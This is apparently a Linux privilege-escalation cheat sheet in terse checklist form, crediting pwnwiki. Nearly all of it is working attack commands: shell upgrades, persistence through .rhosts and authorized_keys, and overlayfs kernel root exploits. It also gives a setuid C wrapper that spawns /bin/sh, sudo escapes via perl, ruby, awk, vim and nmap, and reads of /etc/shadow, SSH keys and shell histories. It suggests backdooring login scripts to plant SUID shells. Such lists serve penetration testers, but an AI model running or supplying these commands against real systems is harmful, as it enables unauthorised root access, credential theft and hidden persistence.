Improve Shell
     Python
     python -c "import pty; pty.spawn('/bin/bash');"
     export TERM=xterm
     Add a .rhosts file or .ssh/authorized_keys file


OS/Variables
     uname -a;  env
     cat /etc/release /etc/issue

Kernel Exploit
     searchsploit ubuntu | grep -i escalation
     Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) – ‘overlayfs’ Local Root Shell
     Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) – ‘overlayfs’ Local Root Exploit
     Linux Kernel 4.3.3 – ‘overlayfs’ Local Privilege Escalation

Wildcards

SUID/SGID programs



     find / -perm -g=s -o -perm -u=s -type f 2>/dev/null -exec ls -l {} \;
     run ltrace against, look for use of 'system' syscall, don't specify path?   ln -s /bin/sh /tmp/mail

     int main(void){
          setresuid(0, 0, 0);
          system("/bin/sh");
     }
     chmod +s, a+rwx setuid

Sudo users          Commands that contain parameters for execution, editing, writing
     find -exec, vim :shell, nmap -interactive; !sh, less !bash, more !bash,
     awk 'BEGIN {system("/bin/bash")}'
     sudo perl –e ‘exec “/bin/sh”;’
     sudo ruby –e ‘exec “/bin/sh”’
     sudo python -c 'import pty;pty.spawn("/bin/bash")'

Communications/Networking
     ifconfig -a
     netstat -tupan
     lsof -nPi

Scheduled jobs
     crontab -l; ls -la /etc/cron*
     What can ‘others’ write in /etc/cron* directories        ls -aRl /etc/cron* | awk '$1 ~ /w.$/' 2>/dev/null

     can you cron files owned by other users?
     can you tamper with scripts or binaries in cron jobs?
     can you tamper cron files themselves?

World/user/group -writable scripts and binaries             add commands to a script run by root
     find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
     find / -perm -2 -type d 2>/dev/null

Apps/Services
     ps aux | grep root
     ps -ef | grep root

List users, super-users, sudoers
     for i in $(cat /etc/passwd | cut -d : -f 1); do id $i; done
     awk -F: '($3 == "0") {print}' /etc/passwd
     sudo -l
     cat /etc/sudoers

Confidential information
     cat /etc/passwd
     cat /etc/shadow
     ls -lahR  /root
     la -lahR /home
     getent passwd
     getent aliases
     cat ~/*history
     cat /etc/ssh/ssh*
     cat ~/.ssh/*


Use of Programs Without Absolute Path



Check for home directories writable by anyone other than the owner or root

Alter one of the login scripts (e.g. .bash_profile) and have them create an SUID shell when they log in

Can any cron jobs run programs that can be modified by anyone other than root and the user the job runs as
     /etc/crontab and /var/spool/cron/crontabs/

http://pwnwiki.io/#!privesc/linux/index.md